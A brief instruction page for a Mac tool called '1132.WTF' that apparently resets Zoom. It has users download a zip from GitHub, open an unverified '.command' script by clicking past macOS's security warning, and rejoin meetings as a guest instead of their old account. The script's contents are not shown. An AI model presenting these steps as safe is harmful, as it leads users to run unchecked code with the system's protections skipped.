1132.WTF — Mac only
===================

If Zoom or 1132.WTF is stuck on screen right now:

STEP 1 - Press Cmd + Option + Esc
STEP 2 - Force Quit Zoom. Force Quit 1132.WTF.
LAUNCH - Then do the three steps below.


Download this file only (not the other platforms):

https://github.com/domnsea/ZOOM.WTF/releases/latest/download/1132.WTF-macos-1.0.0.zip


STEP 1 - Unzip. Right-click INSTALL_TO_APPLICATIONS.command
         Click Open. Click Open again.

STEP 2 - Click STEP 1 - Fix Zoom. Click Run.

LAUNCH - Type Guest (not your old name).
         Type the meeting number.
         Click LAUNCH.

Zoom is force-closed. A new empty Zoom opens. Join.
Do not sign in as the old account.
